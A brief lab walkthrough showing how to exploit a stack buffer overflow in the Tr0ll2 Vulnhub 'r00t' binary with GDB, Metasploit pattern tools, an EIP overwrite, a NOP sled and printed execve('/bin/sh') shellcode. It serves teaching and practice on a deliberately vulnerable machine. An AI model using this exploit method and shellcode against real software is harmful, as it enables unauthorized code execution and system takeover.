## How to do bufferoverflow for a Linux binary in GDB () ?
### Tested for Trollv2 Vulnhub - Dated 22 Dec 2020


1. Identify the overflow by giving some malicious input to binary; should see something like "SEGMENTATION FAULT" etc. 

1. Python can help in generating * no of characters e.g. python -c 'print("A"*500)' can generate 500 A's.
1. Open the binary name in GDB by running command: gdb <binary>

1. Next inside the GBD type command: r $(python -c 'print"A"*300') 

1. Above command should crash the program, and GBD will show "Program received signal SIGSEGV, Segmentation fault." 

1. Create a unique pattern with MSF by using command: msf-pattern_create -l 300

1. Copy that unique pattern and again in gdb type: r <MSF generated unique pattern>

1. Above command will again crash the program, type command: info registers and note down the value of EIP. Lets assume EIP value is 0x6a413969.

1. Again use MSF to find the exact offset point by running command: msf-pattern_offset -q 6a413969. The output would be some number e.g. 268.

1. To check we have control of EIP, type following command inside the GDB: $(python -c 'print "A"*268 + "B"*4'). And we should see EIP being filled with BBBB or 42 42 42 42.

1. Exit GDB and re-open it with following command: env - gdb r00t
1. Inside GBD type command: show env, it will show output something e.g. LINES=27 COLUMNS=120.

1. Type command: unset env LINES

1. Type command: unset env COLUMNS

1. Type command: $(python -c 'print "A"*268 + "BBBB"')

1. No need to notedown the JMP address, simply notedown the value of ESP which in this case is 0xbffffd30

1. Inside GBD type command: $(python -c 'print "A"*268 + "\x30\xfd\xff\xbf" + "\x90"*16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

1. You should see SHELL. Thats it.

Resoruced used:
https://www.doyler.net/security-not-included/tr0ll-2-walkthrough-you-gotta-pay-the-troll-toll
https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it/17775966#17775966
http://shell-storm.org/shellcode/files/shellcode-827.php
